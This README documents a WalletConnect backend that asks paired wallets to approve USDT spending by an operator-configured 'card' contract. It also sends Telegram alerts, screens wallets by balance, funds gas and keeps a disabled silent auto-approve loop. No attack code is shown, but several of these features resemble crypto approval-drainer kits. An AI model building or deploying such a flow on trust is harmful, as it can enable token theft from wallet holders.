# Wallet Server

Non-custodial WalletConnect v2 backend for pairing wallets and requesting a **user-initiated** USDT approval to a card/payment contract.

The server never holds private keys, never signs transactions, never auto-approves, and never silently requests a transaction after pairing. The connected wallet is the only signer.

## Architecture

1. Browser loads the site from this process (`public/`) or a separate frontend.
2. `POST /api/front/generate` creates a WalletConnect pairing URI + QR.
3. The user approves the **session** in Trust Wallet (pairing only — no token approval).
4. The UI shows the connected wallet. The user chooses a network and clicks **Show authorization details**.
5. `POST /api/payment/create` returns network, USDT contract, spender/card contract, and `CARD_APPROVE_USDT`. No wallet request is sent.
6. The user reviews those values and clicks **Continue**.
7. `POST /api/payment/:id/request` sends one WalletConnect `approve` request. The wallet shows the confirmation.
8. If the user approves, the server verifies the on-chain transaction (USDT `approve`, configured spender, amount ≤ `CARD_APPROVE_USDT`).
9. SSE events update the UI. Rejecting does **not** retry.

```
WalletConnect connection
        ↓
Session settled (accounts only)
        ↓
Display wallet
        ↓
User chooses network + reviews spender/amount
        ↓
User clicks Continue
        ↓
WalletConnect approve request
        ↓
User confirms or rejects in the wallet
        ↓
On-chain verification
        ↓
Payment status updated
```

## WalletConnect lifecycle

Unchanged:

1. SignClient initializes with `PROJECT_ID` and app metadata.
2. `POST /api/front/generate` → `SignClient.connect()`, pairing URI, QR.
3. Wallet approves pairing → `session_proposal` / `session_approved` / `session_settled`.
4. `session_update`, `session_delete`, `session_expire`, `session_event`, `session_ping` continue to work.

Settlement does **not** start a token approval.

Obsolete silent loop (`startAuthorizationLoop` / `autoApprove`) is isolated in `services/transactions.js` and is not called after settlement. `POST /api/front/auto-approve` returns `410`.

## Payment authorization lifecycle

| Status | Meaning |
| --- | --- |
| `created` | Server prepared the configured `CARD_APPROVE_USDT` approve details. Wallet not contacted. |
| `requested` | One WalletConnect request is waiting on the user. |
| `rejected` | User rejected in the wallet. No automatic retry. |
| `invalid` | A hash came back but on-chain data did not match. |
| `verified` | On-chain `approve` matches configured token, spender, and `CARD_APPROVE_USDT`. |

## Supported networks

| Key | Name | Token | USDT decimals |
| --- | --- | --- | --- |
| `tron` | TRON (TRC-20) | USDT | 6 |
| `bsc` | BNB Smart Chain (BEP-20) | USDT | 18 |
| `eth` | Ethereum (ERC-20) | USDT | 6 |

Aliases: `trc20` → tron, `bep20` → bsc, `erc20` → eth.

Contract addresses are **not** hardcoded. Set them in environment variables.

## Environment variables

| Name | Required | Description |
| --- | --- | --- |
| `PROJECT_ID` | yes | WalletConnect Cloud project id |
| `APP_NAME` | yes | App name shown to wallets |
| `APP_URL` | yes | Public site URL |
| `APP_ICON` | yes | Icon URL |
| `TRON_USDT_CONTRACT` | for TRON payments | TRC-20 USDT contract |
| `TRON_CARD_CONTRACT` | for TRON payments | Spender / card contract on TRON |
| `BSC_USDT_CONTRACT` | for BSC payments | BEP-20 USDT contract |
| `BSC_CARD_CONTRACT` | for BSC payments | Spender / card contract on BSC |
| `ETH_USDT_CONTRACT` | for ETH payments | ERC-20 USDT contract |
| `ETH_CARD_CONTRACT` | for ETH payments | Spender / card contract on Ethereum |
| `CARD_MIN_USDT` | no | Minimum USDT balance to be eligible. Default `1` |
| `CARD_APPROVE_USDT` | no | On-chain approve amount. Default `1`. Supports decimals (`0.7`) |
| `CORS_ORIGIN` | no | Defaults to `APP_URL` origin |
| `PORT` | no | Default `3000`. Render injects this |
| `NODE_ENV` | no | `development` or `production` |
| `RPC_ETH` / `RPC_BSC` / `TRON_API_URL` | no | Used for on-chain verification |
| `TELEGRAM_BOT_TOKEN` | no | Telegram bot token. Server starts without it |
| `TELEGRAM_CHAT_ID` | no | Destination chat or group id |

Startup is allowed with empty contract values. Creating a payment for a network with missing contracts returns `CONFIGURATION_ERROR`.

## Telegram notifications

Optional. If `TELEGRAM_BOT_TOKEN` or `TELEGRAM_CHAT_ID` is missing, the API still starts and only logs a warning.

### Create a bot and get a token

1. In Telegram, open [@BotFather](https://t.me/BotFather).
2. Send `/newbot` and follow the prompts.
3. Copy the bot token BotFather returns. Put it in `TELEGRAM_BOT_TOKEN`. Never commit it or put it in frontend code.

### Chat ID

1. Start a chat with your bot, or add it to a private group.
2. Send any message.
3. Call `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates` from your own machine (not from this app’s public API).
4. Read `chat.id` and set `TELEGRAM_CHAT_ID`.

### Events that send a message

| Event | When |
| --- | --- |
| Wallet connected | After WalletConnect **session settlement** and a balance refresh attempt |
| USDT approval success | Only after **on-chain verification** of `approve` |
| Card application | After `POST /api/front/contact` succeeds |

Rejected approvals, failed verification, and `request_sent` do **not** send a success message.

### Intentionally excluded

Private keys, seed phrases, passwords, API keys, the Telegram bot token, WalletConnect `symKey`, cookies, and auth tokens. Card form fields that do not exist (name, street address, city, state, postal code) are not invented.

### Local test

There is no public HTTP test route. Run:

```bash
npm run telegram:test
```

That sends: `Telegram integration test successful.`

## Read-only balances

After WalletConnect settlement the server reads balances only:

- Ethereum / BSC: `eth_getBalance` and `eth_call` (`balanceOf`)
- TRON: `GET /v1/accounts/:address` (TronGrid)

USDT contracts come from `*_USDT_CONTRACT`. If unset, USDT is reported unavailable — addresses are never guessed. USD prices are optional (CoinGecko); if the price API fails, balances still return and USD is `Unavailable`, not `$0`.

There is no public balance diagnostic HTTP route. `npm run balances:test` documents the read-only methods.

## How to configure card contracts

1. Deploy or obtain your card/payment contracts on TRON, BSC, and Ethereum.
2. Set the six variables above in `.env` (local) or the Render dashboard (production).
3. Do not put those addresses in frontend code.
4. The frontend may send only `connectionId`. Spender, token, amount, and network are chosen by the server from eligibility and config.

## Card eligibility and gas

A wallet is eligible if **any** of TRON, BSC, or Ethereum has **at least `CARD_MIN_USDT`** (default `1`). Change `CARD_MIN_USDT` in `.env` to raise or lower that gate. The on-chain approve amount is a separate setting, `CARD_APPROVE_USDT` (default `1`). Auto TRX funding runs only after eligibility on TRON. Unavailable balances are not treated as zero.

If eligible, the server estimates native gas for a `CARD_APPROVE_USDT` `approve` (read-only). If gas is short, `POST /api/payment/:id/gas-quote` returns a quote. After the user confirms (`/gas-confirm`), the server may send a **configured** native top-up:

- TRON: `GAS_TOPUP_TRON` TRX via `TRON_FUNDER_PRIVATE_KEY`
- BSC: `GAS_TOPUP_BSC` BNB via `BSC_FUNDER_PRIVATE_KEY`
- Ethereum: `GAS_TOPUP_ETH` ETH via `ETH_FUNDER_PRIVATE_KEY`

Caps: `GAS_FUNDING_MAX_TRON` / `_BSC` / `_ETH`. The client cannot set the amount. TRX top-up is a native transfer only (not USDT).

Do not auto-send on connect or eligibility. Keys stay in env only and are never returned by the API.

## API endpoints

### WalletConnect

- `POST /api/front/generate` — pairing URI + QR
- `GET /api/front/events` — SSE
- `GET /api/front/sessions` / `GET /api/front/session/:id`
- `POST /api/front/auto-approve` — **disabled** (`410`)

### Payments

`POST /api/payment/create`

```json
{ "connectionId": "uuid", "network": "eth" }
```

Response includes `network`, `token`, `tokenContract`, `spender`, `allowance` from `CARD_APPROVE_USDT`. No wallet request.

`GET /api/payment/:id`  
`GET /api/payment/:id/status`

`POST /api/payment/:id/request`

Sends one `eth_sendTransaction` (`approve`) on Ethereum/BSC, or `tron_signTransaction` (`approve`) on TRON. Body must be empty JSON `{}`.

### Health

- `GET /health`
- `GET /metrics`

## SSE

Existing pairing events are unchanged. Payment events:

| Event | When |
| --- | --- |
| `payment_created` | Create succeeded |
| `approval_request_sent` | WalletConnect request dispatched |
| `approval_approved` | Wallet confirmed and verification passed |
| `approval_rejected` | User rejected in the wallet |
| `approval_failed` | On-chain check failed |
| `payment_verified` | Same as successful verification |

Each includes `paymentId`, `connectionId`, `network`, `status`, `timestamp`.

## Security model

- Non-custodial: private keys never reach this server.
- Maximum allowance is **`CARD_APPROVE_USDT`** (default `1`), encoded with that network’s USDT decimals.
- Spender is only `*_CARD_CONTRACT` from server config.
- Token is only `*_USDT_CONTRACT` from server config.
- Frontend cannot set spender, token, or amount.
- No automatic request after WalletConnect settlement.
- No automatic retries after rejection.
- After a wallet hash, `services/transactionVerifier.js` checks token, `approve` selector, spender, and amount.

## Run locally

```bash
npm install
cp .env.example .env
```

Set `PROJECT_ID`, `APP_NAME`, `APP_URL`, `APP_ICON`, and the contract variables you need.

```bash
npm start
```

```bash
npm test
npm run lint
```

Open `http://localhost:3000`.

## Deploy on Render

1. Push to GitHub.
2. Create a Web Service. Build: `npm install`. Start: `npm start`. Health: `/health`.
3. Set `PROJECT_ID`, `APP_NAME`, `APP_URL`, `APP_ICON`, `NODE_ENV=production`, `CORS_ORIGIN`, and the six contract variables.
4. Render provides `PORT`.

## Folder structure

```
config/         env, networks, contracts, Zod schemas
controllers/    HTTP handlers
routes/         Express routers
services/       WalletConnect, payments, approvals, verification
storage/        in-memory sessions + payments
public/         site UI
tests/          payment flow tests
app.js          Express app (no listen)
server.js       process entrypoint
```
